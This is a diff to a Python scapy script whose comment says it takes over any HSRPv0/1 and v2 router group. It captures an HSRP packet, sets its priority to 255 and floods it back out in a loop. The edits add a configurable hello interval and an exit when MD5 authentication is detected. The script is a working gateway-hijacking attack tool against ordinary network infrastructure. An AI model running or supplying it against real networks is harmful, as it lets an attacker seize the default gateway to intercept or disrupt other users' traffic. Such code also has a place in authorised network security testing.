@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 # $Id: 20121212$
-# $Date: 2012-12-12 11:27:12$
+# $Date: 2012-12-12 12:50:37$
 # $Author: Marek Lukaszuk$
 
 # This takes over any HSRPv0/1 and v2 
@@ -23,6 +23,7 @@ IPv6Src = "2001::ff"
 EthSrc = "00:aa:bb:cc:dd:ee"
 interface = "tap2"
 HSRPpri = 255
+HSRPHelloTime = 1
 
 # scapy verbose toggle
 conf.verb = 0
@@ -96,7 +97,7 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
     if off >= len(data):
       break
 
-    if data[off] == "\x01": # HSRPv2 TLV for group
+    if data[off] == "\x01": # HSRPv2 TLV for group TODO
       data = data[:off+16]+chr(HSRPpri)+data[off+17:]
 
     if data[off] == "\x04":
@@ -115,6 +116,10 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
   # print data.encode('hex')
   p[UDP].payload = data.decode('string_escape')
 else:
+  if len(p[HSRP]) > 28: # HSRPv0/1 Auth - TODO
+    print "[-] auth HSRP using MD5, stopping"
+    sys.exit(1)
+
   p[HSRP].priority = chr(HSRPpri)
 
 print "[+] packet modified, sending"
@@ -124,5 +129,5 @@ while True:
   sendp(p,iface = interface)
   sys.stdout.write(".")
   sys.stdout.flush()
-  time.sleep(1) # this could be tweaked
+  time.sleep(HSRPHelloTime) # this could be tweaked
 
